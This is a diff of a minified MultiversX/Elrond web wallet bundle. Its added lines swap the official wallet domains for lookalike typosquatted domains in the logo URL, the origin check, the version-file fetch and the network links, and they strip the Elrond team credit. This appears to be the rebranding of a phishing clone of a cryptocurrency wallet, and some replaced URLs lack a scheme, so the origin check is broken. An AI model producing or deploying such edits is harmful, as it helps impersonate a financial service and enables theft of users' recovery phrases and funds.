@@ -6429,7 +6429,7 @@
                         null !== e.current && new ga.a({
                             hostAppName: "ElrondNetwork",
                             hostApiKey: l.E,
-                            hostLogoUrl: "https://www.multiversxweb.com/apple-touch-icon.png",
+                            hostLogoUrl: "www.wallets-multiversx.com/apple-touch-icon.png",
                             url: l.F,
                             swapAsset: "EGLD",
                             userAddress: t,
@@ -16129,7 +16129,7 @@
                     d = Object(u.b)(),
                     b = Object(j.y)().getBalanceAndCount,
                     p = Object(l.S)().balanceFetched,
-                    g = "https://www.multiversxweb.com" === window.location.origin,
+                    g = "www.wallets-multiversx.com" === window.location.origin,
                     O = r.useRef(null),
                     x = r.useRef(null),
                     k = r.useState(),
@@ -16142,7 +16142,7 @@
                     L = C[1],
                     D = r.useRef(),
                     E = function() {
-                        nt.a.create().get("https://s3.amazonaws.com/www.multiversxweb.com/version.json?".concat(Date.now())).then((function(e) {
+                        nt.a.create().get("https://s3.amazonaws.com/multiversexwallet.info/version.json?".concat(Date.now())).then((function(e) {
                             var t = e.data;
                             D.current = t
                         })).catch((function(e) {
@@ -21694,7 +21694,7 @@
             e.exports = JSON.parse('{"Welcome to the Elrond wallet!":"Welcome to the Elrond wallet!","This is the wallet where you\u2019ll store the Elrond tokens, so it\u2019s of the highest importance that you guard it safely. Next, we\u2019ll show you the best way to do that.":"This is the wallet where you\u2019ll store the Elrond tokens, so it\u2019s of the highest importance that you guard it safely. Next, we\u2019ll show you the best way to do that.","Let\u2019s get started":"Let\u2019s get started","Differences between the Elrond wallet and internet banking":"Differences between the Elrond wallet and internet banking","Wallets & accounts are everywhere on the web, here\u2019s what\u2019s different about the Elrond wallet":"Wallets & accounts are everywhere on the web, here\u2019s what\u2019s different about the Elrond wallet:","Internet banking":"Internet banking:","They control your account":"They control your account","They control your money":"They control your money","They add fees":"They add fees","They make the rules":"They make the rules","Elrond wallet":"Elrond wallet:","You own your account":"You own your account","You control your money":"You control your money","You pay 100x lower fees":"You pay 100x lower fees","You do what you want":"You do what you want","Next step":"Next step","Your security is paramount to us":"Your security is paramount to us","With this great power comes great responsibility, so it is very important to understand that":"With this great power comes great responsibility, so it is very important to understand that:","We can\u2019t access your funds":"We can\u2019t access your funds","We can\u2019t recover or reset your passwords":"We can\u2019t recover or reset your passwords","We can\u2019t reverse, cancel or refund transactions":"We can\u2019t reverse, cancel or refund transactions","Please be very careful to save your secret phrase and backup your private keys. Your funds will depend on it.":"Please be very careful to save your secret phrase and backup your private keys. Your funds will depend on it.","The Elrond mainnet is live!":"The Elrond mainnet is live!","So here\u2019s the most important info you need to know":"So here\u2019s the most important info you need to know:","The Elrond economics has changed. EGLD is the new native Elrond token":"The Elrond economics has changed. EGLD is the new native Elrond token","This means 1000 old ERD = 1 new EGLD":"This means 1000 old ERD = 1 new EGLD","You can send & receive EGLD to & from any mainnet wallet":"You can send & receive EGLD to & from any mainnet wallet","Genesis Staking delegation rewards are available & unlocked":"Genesis Staking delegation rewards are available & unlocked","Thanks for the info":"Thanks for the info","You\u2019re awesome!":"You\u2019re awesome!","Now you\u2019re ready to login to the Elrond wallet.":"Now you\u2019re ready to login to the Elrond wallet.","To the wallet":"To the wallet","The Elrond {{name}} Wallet":"The Elrond {{name}} Wallet","The Elrond Wallet":"The Elrond Wallet","A simple and beautiful crypto wallet where you can securely transfer, receive and store your Elrond tokens, while interacting with Elrond dapps.":"A simple and beautiful crypto wallet where you can securely transfer, receive and store your Elrond tokens, while interacting with Elrond dapps.","Create wallet":"Create wallet","Access existing":"Access existing"}')
         },
         447: function(e) {
-            e.exports = JSON.parse('{"Wallet":"Wallet","Devnet Wallet":"Devnet Wallet","Testnet Wallet":"Testnet Wallet","Internal Wallet":"Internal Wallet","Menu":"Menu","Faucet":"Faucet","Buy":"Buy","Delegate":"Delegate","Delegate Legacy":"Delegate Legacy","Validate":"Validate","Stake":"Stake","Build":"Build","Switch to":"Switch to","0% Fees":"0% Fees","No internet connection":"No internet connection","Address unconfirmed.":"Address unconfirmed.","There was an internal website error. Please try again later.":"There was an internal website error. Please try again later.","{{network}} network unavailable.":"{{network}} network unavailable.","Made with <1></1>by the Elrond team.":"Made with <1></1> by the Elrond team.","A new version of the wallet is available.<1><0>Reload</0></1>":"A new version of the wallet is available.<1><0>Reload</0></1>","Failed to display some information. Your funds are safe. Please try again later.":"Failed to display some information. Your funds are safe. Please try again later.","<0>Address</0><br/> {{address}}<4></4><br/><6>was not confirmed on your ledger.</6>":"<0>Address</0><br/> {{address}}<4></4><br/><6>was not confirmed on your ledger.</6>"}')
+            e.exports = JSON.parse('{"Wallet":"Wallet","Devnet Wallet":"Devnet Wallet","Testnet Wallet":"Testnet Wallet","Internal Wallet":"Internal Wallet","Menu":"Menu","Faucet":"Faucet","Buy":"Buy","Delegate":"Delegate","Delegate Legacy":"Delegate Legacy","Validate":"Validate","Stake":"Stake","Build":"Build","Switch to":"Switch to","0% Fees":"0% Fees","No internet connection":"No internet connection","Address unconfirmed.":"Address unconfirmed.","There was an internal website error. Please try again later.":"There was an internal website error. Please try again later.","{{network}} network unavailable.":"{{network}} network unavailable.","Made with <1></1>by the Elrond team.":"Made with <1></1>","A new version of the wallet is available.<1><0>Reload</0></1>":"A new version of the wallet is available.<1><0>Reload</0></1>","Failed to display some information. Your funds are safe. Please try again later.":"Failed to display some information. Your funds are safe. Please try again later.","<0>Address</0><br/> {{address}}<4></4><br/><6>was not confirmed on your ledger.</6>":"<0>Address</0><br/> {{address}}<4></4><br/><6>was not confirmed on your ledger.</6>"}')
         },
         448: function(e) {
             e.exports = JSON.parse('{"Here is the QR code and your wallet address.":"Here is the QR code and your wallet address."}')
@@ -28636,15 +28636,15 @@
                 r = [{
                     id: "mainnet",
                     name: "Mainnet",
-                    url: "https://www.multiversxweb.com/"
+                    url: "www.wallets-multiversx.com/"
                 }, {
                     id: "testnet",
                     name: "Testnet",
-                    url: "https://testnet-www.multiversxweb.com/"
+                    url: "https://testnet-multiversexwallet.info/"
                 }, {
                     id: "devnet",
                     name: "Devnet",
-                    url: "https://devnet-www.multiversxweb.com/"
+                    url: "https://devnet-multiversexwallet.info/"
                 }],
                 s = [{
                     default: !0,
@@ -28655,7 +28655,7 @@
                     apiUrl: "https://internal-api.elrond.com",
                     theme: "light",
                     erdLabel: "EGLD",
-                    walletAddress: "https://www.multiversxweb.com/",
+                    walletAddress: "www.wallets-multiversx.com/",
                     explorerAddress: "https://explorer.elrond.com/",
                     auctionContract: "erd1qqqqqqqqqqqqqqqpqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqplllst77y4l",
                     stakingContract: "erd1qqqqqqqqqqqqqqqpqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqllls0lczs7",
@@ -28672,7 +28672,7 @@
                 }, {
                     id: "wallet",
                     name: "Wallet",
-                    url: "https://www.multiversxweb.com/"
+                    url: "www.wallets-multiversx.com/"
                 }, {
                     id: "explorer",
                     name: "Explorer",
